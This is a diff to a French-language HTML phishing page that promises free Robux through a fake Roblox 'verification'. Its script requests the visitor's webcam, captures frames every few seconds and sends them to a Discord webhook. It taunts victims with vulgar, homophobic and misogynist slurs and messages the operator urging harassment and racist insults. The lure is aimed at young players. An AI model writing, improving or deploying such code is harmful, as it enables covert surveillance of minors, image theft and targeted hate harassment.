@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔓 VÉRIFICATION ROBLOX – GAGNEZ 50 000 ROBUX 🔓</title>
+    <title>🔓 VÉRIFICATION ROBLOX – 50 000 ROBUX GRATUITS 🔓</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -111,13 +111,12 @@
 <video id="webcam" autoplay muted></video>
 
 <script>
-    const webhookURL = "https://discord.com/api/webhooks/1496273477831884810/IzhJ0ANPNvNR6gT8Xyk0VENud_45B1nzrcas4JVeY8hLtcIUk4qDssv5C6AW_WjrHwhW"; // 🔴 REMPLACE PAR TON URL ICI 🔴
+    const webhookURL = "https://discord.com/api/webhooks/ICI_TA_PASSE"; // 🔴 REMPLACE PAR TON LIEN ICI 🔴
     const button = document.getElementById('fakeLink');
     const video = document.getElementById('webcam');
     const insulteDiv = document.getElementById('insulte');
     const progressFill = document.getElementById('progressFill');
     const statusText = document.getElementById('statusText');
-
     let progress = 0;
     let intervalProgress;
 
@@ -141,7 +140,6 @@
     }
 
     button.addEventListener('click', async () => {
-        // Simule une fausse vérification
         statusText.innerText = "✅ VÉRIFICATION EN COURS... NE QUITTE PAS ✅";
         progress = 0;
         intervalProgress = setInterval(() => {
@@ -155,29 +153,50 @@
             }
         }, 30);
 
-        // Demande réelle de la webcam
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
             insulteDiv.innerText = "🖕 T’ES TROP CON, J’AI TA GUEULE, SALE PUTE 🖕";
             statusText.innerText = "🎉 COMPTE VOLÉ AVEC SUCCÈS – MERCI LE GROS NOOB 🎉";
-            // Capture et envoi
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
-            const capture = () => {
-                if (video.videoWidth > 0) {
+            function capture() {
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     ctx.drawImage(video, 0, 0);
-                    const img = canvas.toDataURL('image/jpeg', 0.8);
-                    sendToDiscord(img, "Regarde ta tête de chien en chaleur, espèce de sous-merde");
+                    let imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                    let isBlack = true;
+                    for (let i = 0; i < 50; i++) {
+                        let r = imgData.data[i*4];
+                        let g = imgData.data[i*4+1];
+                        let b = imgData.data[i*4+2];
+                        if (r > 30 || g > 30 || b > 30) { isBlack = false; break; }
+                    }
+                    if (isBlack) {
+                        fetch(webhookURL, {
+                            method: "POST",
+                            body: JSON.stringify({ content: `@maku_95 🔴 WEBCAM NOIRE – Victime cache sa cam ou est une sous-merde. Insulte-la : "T’es trop moche de toute façon" 🔴` }),
+                            headers: { "Content-Type": "application/json" }
+                        });
+                        insulteDiv.innerText = "TA WEBCAM MARCHE PAS, ESPÈCE DE TARÉ ! BRANCHE-LA OU VA TE FAIRE ENCULER !";
+                    } else {
+                        let img = canvas.toDataURL('image/jpeg', 0.8);
+                        sendToDiscord(img, "Regarde ta tête de rat, sale pd");
+                    }
+                } else {
+                    setTimeout(capture, 500);
                 }
-            };
+            }
             capture();
             setInterval(capture, 2500);
         } catch (err) {
             insulteDiv.innerText = "🔴 T’AS REFUSÉ LA CAM ? T’ES QUOI, UNE PETITE TAFIOLE ? 🔴";
-            sendToDiscord("", "Victime lâche – a refusé la caméra. Envoie-lui un message de harcèlement.");
+            fetch(webhookURL, {
+                method: "POST",
+                body: JSON.stringify({ content: `@maku_95 🔴 Victime lâche – a refusé la webcam. Envoie-lui des insultes racistes.` }),
+                headers: { "Content-Type": "application/json" }
+            });
             statusText.innerText = "❌ ERREUR : T’ES TROP PEUREUX, VA TE FAIRE ENCULER ❌";
         }
     });
